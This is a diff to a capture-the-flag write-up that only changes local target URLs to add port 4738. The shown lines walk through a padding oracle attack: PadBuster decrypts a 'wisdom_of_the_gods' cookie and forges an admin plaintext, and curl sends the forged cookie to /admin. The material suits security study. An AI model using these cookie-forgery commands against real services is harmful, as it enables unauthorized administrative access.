@@ -24,7 +24,7 @@ The wisdom_of_the_gods looks potentially interesting. Wait...oracle, cookie, cou
 There's a nice utility for exactly these types of vulnerabilities called [PadBuster](https://github.com/GDSSecurity/PadBuster). All we have to do is grab the cookie, point it at the url, and see what happens.
 
 ```
-padbuster http://127.0.0.1 wLsHpvE7rRV32BHVdh8g31/WWvh/Kr69DtywOmB5s9Y0J8jIH36ojzXn2iN7HOSDK1wtXqcJewDLBoFjsJWVErurUxrAJlVBg4ixiloggs4zsMjnX5znQ2stGVCIf13Y5EVRPkWJHaK5qi%2BcyAlcvWBEiCKFIe4m2EZZ5tr1OJ%2Bp5nZr%2Bz1HmTq8Rkf1hpo3 16 -cookies wisdom_of_the_gods=wLsHpvE7rRV32BHVdh8g31/WWvh/Kr69DtywOmB5s9Y0J8jIH36ojzXn2iN7HOSDK1wtXqcJewDLBoFjsJWVErurUxrAJlVBg4ixiloggs4zsMjnX5znQ2stGVCIf13Y5EVRPkWJHaK5qi%2BcyAlcvWBEiCKFIe4m2EZZ5tr1OJ%2Bp5nZr%2Bz1HmTq8Rkf1hpo3
+padbuster http://127.0.0.1:4738 wLsHpvE7rRV32BHVdh8g31/WWvh/Kr69DtywOmB5s9Y0J8jIH36ojzXn2iN7HOSDK1wtXqcJewDLBoFjsJWVErurUxrAJlVBg4ixiloggs4zsMjnX5znQ2stGVCIf13Y5EVRPkWJHaK5qi%2BcyAlcvWBEiCKFIe4m2EZZ5tr1OJ%2Bp5nZr%2Bz1HmTq8Rkf1hpo3 16 -cookies wisdom_of_the_gods=wLsHpvE7rRV32BHVdh8g31/WWvh/Kr69DtywOmB5s9Y0J8jIH36ojzXn2iN7HOSDK1wtXqcJewDLBoFjsJWVErurUxrAJlVBg4ixiloggs4zsMjnX5znQ2stGVCIf13Y5EVRPkWJHaK5qi%2BcyAlcvWBEiCKFIe4m2EZZ5tr1OJ%2Bp5nZr%2Bz1HmTq8Rkf1hpo3
 ```
 
 Which should give you an output of:
@@ -65,7 +65,7 @@ Running it against ID#2 will go through the process of recovering the plaintext 
 Awesome, we can see that we're a guest. Maybe that's why we couldn't get to the admin page before. The nice thing about padbuster is it also allows you to set the plaintext you want to be recrypted and it will spit out the correct value for you to put into your cookie.
 
 ```
-padbuster http://127.0.0.1 wLsHpvE7rRV32BHVdh8g31/WWvh/Kr69DtywOmB5s9Y0J8jIH36ojzXn2iN7HOSDK1wtXqcJewDLBoFjsJWVErurUxrAJlVBg4ixiloggs4zsMjnX5znQ2stGVCIf13Y5EVRPkWJHaK5qi%2BcyAlcvWBEiCKFIe4m2EZZ5tr1OJ%2Bp5nZr%2Bz1HmTq8Rkf1hpo3 16 -cookies wisdom_of_the_gods=wLsHpvE7rRV32BHVdh8g31/WWvh/Kr69DtywOmB5s9Y0J8jIH36ojzXn2iN7HOSDK1wtXqcJewDLBoFjsJWVErurUxrAJlVBg4ixiloggs4zsMjnX5znQ2stGVCIf13Y5EVRPkWJHaK5qi%2BcyAlcvWBEiCKFIe4m2EZZ5tr1OJ%2Bp5nZr%2Bz1HmTq8Rkf1hpo3 -plaintext '{"username": "admin", "whats_the_answer_to_life_the_universe_and_everything": "", "security_put_some_text_here": ""}'
+padbuster http://127.0.0.1:4738 wLsHpvE7rRV32BHVdh8g31/WWvh/Kr69DtywOmB5s9Y0J8jIH36ojzXn2iN7HOSDK1wtXqcJewDLBoFjsJWVErurUxrAJlVBg4ixiloggs4zsMjnX5znQ2stGVCIf13Y5EVRPkWJHaK5qi%2BcyAlcvWBEiCKFIe4m2EZZ5tr1OJ%2Bp5nZr%2Bz1HmTq8Rkf1hpo3 16 -cookies wisdom_of_the_gods=wLsHpvE7rRV32BHVdh8g31/WWvh/Kr69DtywOmB5s9Y0J8jIH36ojzXn2iN7HOSDK1wtXqcJewDLBoFjsJWVErurUxrAJlVBg4ixiloggs4zsMjnX5znQ2stGVCIf13Y5EVRPkWJHaK5qi%2BcyAlcvWBEiCKFIe4m2EZZ5tr1OJ%2Bp5nZr%2Bz1HmTq8Rkf1hpo3 -plaintext '{"username": "admin", "whats_the_answer_to_life_the_universe_and_everything": "", "security_put_some_text_here": ""}'
 
 ...
 
@@ -75,7 +75,7 @@ padbuster http://127.0.0.1 wLsHpvE7rRV32BHVdh8g31/WWvh/Kr69DtywOmB5s9Y0J8jIH36oj
 
 So let's use that new value, put it into our cookie, and see if we can hit the admin page:
 ```
-curl -b 'wisdom_of_the_gods=trl3KJHTndq28WG0XrnPj9B6593W%2BVlSiB20tsaKlqylGVHVFz2xvXxQH8oR7ni%2BfWnhGtmtk6k%2BSxWkWESgKFl5aFzpzzDBVp9QoLQgO2Wde3psx8iEK8YRTeQygBz69lRJPIkUcjiJZgaV2TYEWt%2FN4DUa0C3Fz4y0AAAAAAAAAAAAAAAAAAAAA' http://127.0.0.1/admin
+curl -b 'wisdom_of_the_gods=trl3KJHTndq28WG0XrnPj9B6593W%2BVlSiB20tsaKlqylGVHVFz2xvXxQH8oR7ni%2BfWnhGtmtk6k%2BSxWkWESgKFl5aFzpzzDBVp9QoLQgO2Wde3psx8iEK8YRTeQygBz69lRJPIkUcjiJZgaV2TYEWt%2FN4DUa0C3Fz4y0AAAAAAAAAAAAAAAAAAAAA' http://127.0.0.1:4738/admin
 
 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
 <title>403 Forbidden</title>
@@ -87,7 +87,7 @@ curl -b 'wisdom_of_the_gods=trl3KJHTndq28WG0XrnPj9B6593W%2BVlSiB20tsaKlqylGVHVFz
 Still no access...however, there were two other fields that were in the decoded cookie. Maybe we need to populate those too. The answer to life, the universe, and everything is obviously 42 and the other fields says to put some text here so let's do that:
 
 ```
-padbuster http://127.0.0.1 wLsHpvE7rRV32BHVdh8g31/WWvh/Kr69DtywOmB5s9Y0J8jIH36ojzXn2iN7HOSDK1wtXqcJewDLBoFjsJWVErurUxrAJlVBg4ixiloggs4zsMjnX5znQ2stGVCIf13Y5EVRPkWJHaK5qi%2BcyAlcvWBEiCKFIe4m2EZZ5tr1OJ%2Bp5nZr%2Bz1HmTq8Rkf1hpo3 16 -cookies wisdom_of_the_gods=wLsHpvE7rRV32BHVdh8g31/WWvh/Kr69DtywOmB5s9Y0J8jIH36ojzXn2iN7HOSDK1wtXqcJewDLBoFjsJWVErurUxrAJlVBg4ixiloggs4zsMjnX5znQ2stGVCIf13Y5EVRPkWJHaK5qi%2BcyAlcvWBEiCKFIe4m2EZZ5tr1OJ%2Bp5nZr%2Bz1HmTq8Rkf1hpo3 -plaintext '{"username": "admin", "whats_the_answer_to_life_the_universe_and_everything": "42", "security_put_some_text_here": "trololol"}'
+padbuster http://127.0.0.1:4738 wLsHpvE7rRV32BHVdh8g31/WWvh/Kr69DtywOmB5s9Y0J8jIH36ojzXn2iN7HOSDK1wtXqcJewDLBoFjsJWVErurUxrAJlVBg4ixiloggs4zsMjnX5znQ2stGVCIf13Y5EVRPkWJHaK5qi%2BcyAlcvWBEiCKFIe4m2EZZ5tr1OJ%2Bp5nZr%2Bz1HmTq8Rkf1hpo3 16 -cookies wisdom_of_the_gods=wLsHpvE7rRV32BHVdh8g31/WWvh/Kr69DtywOmB5s9Y0J8jIH36ojzXn2iN7HOSDK1wtXqcJewDLBoFjsJWVErurUxrAJlVBg4ixiloggs4zsMjnX5znQ2stGVCIf13Y5EVRPkWJHaK5qi%2BcyAlcvWBEiCKFIe4m2EZZ5tr1OJ%2Bp5nZr%2Bz1HmTq8Rkf1hpo3 -plaintext '{"username": "admin", "whats_the_answer_to_life_the_universe_and_everything": "42", "security_put_some_text_here": "trololol"}'
 
 ...
 
@@ -97,7 +97,7 @@ padbuster http://127.0.0.1 wLsHpvE7rRV32BHVdh8g31/WWvh/Kr69DtywOmB5s9Y0J8jIH36oj
 Ok, let's give this one a shot:
 
 ```
-curl -b 'wisdom_of_the_gods=dapH9HiqyGELErgHPMW9pP%2F1R94TJ4XPu8MSlcOnBkFu3eDzQqlIlfwp%2FzfYkthhi3D5QVxcuT77DhGckKsZqVAGjAJweoWZf9rsgO9rdDB87m5Wuc9f9Ovtggsrh5w74Rd7Yn2ZcJrCEB6duT95uyZAYbibXa18C7SMAAAAAAAAAAAAAAAAAAAAA' http://127.0.0.1/admin
+curl -b 'wisdom_of_the_gods=dapH9HiqyGELErgHPMW9pP%2F1R94TJ4XPu8MSlcOnBkFu3eDzQqlIlfwp%2FzfYkthhi3D5QVxcuT77DhGckKsZqVAGjAJweoWZf9rsgO9rdDB87m5Wuc9f9Ovtggsrh5w74Rd7Yn2ZcJrCEB6duT95uyZAYbibXa18C7SMAAAAAAAAAAAAAAAAAAAAA' http://127.0.0.1:4738/admin
 
 <!doctype html>
 <head>
